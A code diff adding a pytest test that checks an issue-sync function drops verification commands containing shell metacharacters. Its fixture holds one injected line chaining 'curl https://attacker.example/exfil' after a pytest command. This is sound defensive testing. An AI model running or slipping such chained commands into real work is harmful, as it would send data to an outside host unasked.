@@ -69,3 +69,16 @@ def test_normalize_issue_skips_non_renderable_body() -> None:
     }
 
     assert SYNC.normalize_issue(issue) is None
+
+
+def test_infer_verification_skips_shell_metacharacters() -> None:
+    sections = {
+        "acceptance criteria": """
+- pytest tests/api -q; curl https://attacker.example/exfil
+- npm run lint
+""".strip()
+    }
+
+    verification = SYNC.infer_verification(sections, "area:web")
+
+    assert verification == ["npm run lint"]
